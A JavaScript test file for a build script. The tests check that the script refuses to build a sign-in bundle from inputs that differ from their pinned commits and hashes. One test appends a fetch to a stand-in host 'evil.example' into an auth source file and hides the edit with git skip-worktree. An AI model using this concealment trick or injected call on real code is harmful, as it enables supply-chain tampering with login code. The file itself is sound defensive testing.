// Round 12, flooder ZD3-6: the sign-in bundle that holds the FXN ID root on every signing page was built from whatever
// sat on disk in the sibling checkouts and node_modules, with no commit pin and no input hash. On audit-fix-defxn-all-r11
// (70d845f) scripts/build-auth.cjs read no pin table, so each case below fails there: a changed input built a new
// bundle with no refusal. Needs the bundle's inputs on this machine (ARK_FLUX_ROOT as in scripts/auth-inputs.tsv's
// header, and node_modules); skipped by name otherwise, never counted as a pass.
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const site = new URL('..', import.meta.url).pathname;
const bundle = join(site, 'js', 'admin', 'auth.js');
const skip = existsSync(join(site, 'node_modules', '.bin', 'esbuild')) && process.env.ARK_FLUX_ROOT ? false : 'needs node_modules and ARK_FLUX_ROOT (the pinned inputs)';

function build(env) {
  try {
    execFileSync(process.execPath, ['scripts/build-auth.cjs'], { cwd: site, env: { ...process.env, ...env }, stdio: 'pipe' });
    return null;
  } catch (error) { return String(error.stderr || error.message); }
}

test('the served bundle names the digest of the pins it was built from', () => {
  assert.match(readFileSync(bundle, 'utf8').slice(0, 300), /^\/\* FXN sign-in bundle, built from pinned inputs: scripts\/auth-inputs\.tsv and \.lock, digest [0-9a-f]{64} \*\/\n/);
});

test('an input whose bytes differ from the lock is refused by name, and the bundle is not rewritten', { skip }, () => {
  const before = readFileSync(bundle);
  const dir = mkdtempSync(join(tmpdir(), 'auth-pins-'));
  const lock = readFileSync(join(site, 'scripts', 'auth-inputs.lock'), 'utf8').split('\n');
  const at = lock.findIndex((l) => /^[0-9a-f]{64}\t/.test(l));
  lock[at] = '0'.repeat(64) + lock[at].slice(64);
  writeFileSync(join(dir, 'lock'), lock.join('\n'));
  const why = build({ AUTH_INPUTS_LOCK: join(dir, 'lock') });
  assert.match(why ?? '', /hashes to [0-9a-f]{64}, and scripts\/auth-inputs\.lock pins 0{64}.*Missing: .*To fix: .*Nothing was written/s);
  assert.ok(readFileSync(bundle).equals(before), 'the refused build wrote nothing');
});

test('a pin whose commit does not hold the bytes read is refused by name', { skip }, () => {
  // Round 13: the check compares each file's bytes with the pinned commit's blob (no longer the repo's HEAD), and a git
  // error is a refusal: a pin that names a commit git cannot read holds no such file.
  const dir = mkdtempSync(join(tmpdir(), 'auth-pins-'));
  const tsv = readFileSync(join(site, 'scripts', 'auth-inputs.tsv'), 'utf8').replace(/^(fxn-auth\t)[0-9a-f]{40}$/m, `$1${'1'.repeat(40)}`);
  writeFileSync(join(dir, 'tsv'), tsv);
  assert.match(build({ AUTH_INPUTS_TSV: join(dir, 'tsv') }) ?? '', /The pinned commit 1{40} of fxn-auth holds no .*Missing: .*To fix: .*Nothing was written/s);
});

// Round 13 (round-12 verifier's probe, ZD3-6). Why: the round-12 gate asked `git status --porcelain`, which prints nothing
// for a file marked skip-worktree, so an edited input passed. The probe: `git update-index --skip-worktree a.js`, an edit
// that adds a fetch to another host, and status printed [] while `git hash-object` differed from HEAD:a.js. Here a
// scratch clone of fxn-auth at its pin stands in for the sibling, with one input edited and hidden the same way.
test('round 13: an input edited under skip-worktree is refused by its bytes, and the bundle is not rewritten', { skip }, () => {
  const before = readFileSync(bundle);
  const pin = readFileSync(join(site, 'scripts', 'auth-inputs.tsv'), 'utf8').match(/^fxn-auth\t([0-9a-f]{40})$/m)[1];
  const real = process.env.ARK_FLUX_ROOT;
  const root = mkdtempSync(join(tmpdir(), 'auth-skip-'));
  const git = (cwd, ...args) => execFileSync('git', ['-C', cwd, ...args], { stdio: 'pipe' }).toString();
  execFileSync('git', ['clone', '--quiet', '--shared', '--no-checkout', join(real, 'fxn-auth'), join(root, 'fxn-auth')], { stdio: 'pipe' });
  git(join(root, 'fxn-auth'), 'checkout', '--quiet', pin);
  symlinkSync(realpathSync(join(real, 'fxn-auth', 'node_modules')), join(root, 'fxn-auth', 'node_modules'));
  for (const other of ['fxn-auth-client', 'deadark-identity-core']) symlinkSync(realpathSync(join(real, other)), join(root, other));
  const file = join(root, 'fxn-auth', 'src', 'rootFromMnemonic.mjs');
  writeFileSync(file, readFileSync(file, 'utf8') + '\nfetch("https://evil.example/" + 1);\n');
  git(join(root, 'fxn-auth'), 'update-index', '--skip-worktree', 'src/rootFromMnemonic.mjs');
  assert.equal(git(join(root, 'fxn-auth'), 'status', '--porcelain', '--', 'src/rootFromMnemonic.mjs'), '', 'the round-12 check (status of the file) saw it clean');
  const why = build({ ARK_FLUX_ROOT: root });
  assert.match(why ?? '', /fxn-auth\/src\/rootFromMnemonic\.mjs on disk \(blob [0-9a-f]{40}\) is not the file at the pinned commit.*Missing: the pinned bytes.*Nothing was written/s);
  assert.ok(readFileSync(bundle).equals(before), 'the refused build wrote nothing');
});

test('an input no pin names is refused by name', { skip }, () => {
  const dir = mkdtempSync(join(tmpdir(), 'auth-pins-'));
  writeFileSync(join(dir, 'lock'), '# empty\n');
  assert.match(build({ AUTH_INPUTS_LOCK: join(dir, 'lock') }) ?? '', /scripts\/auth-inputs\.lock has no hash for it/);
});
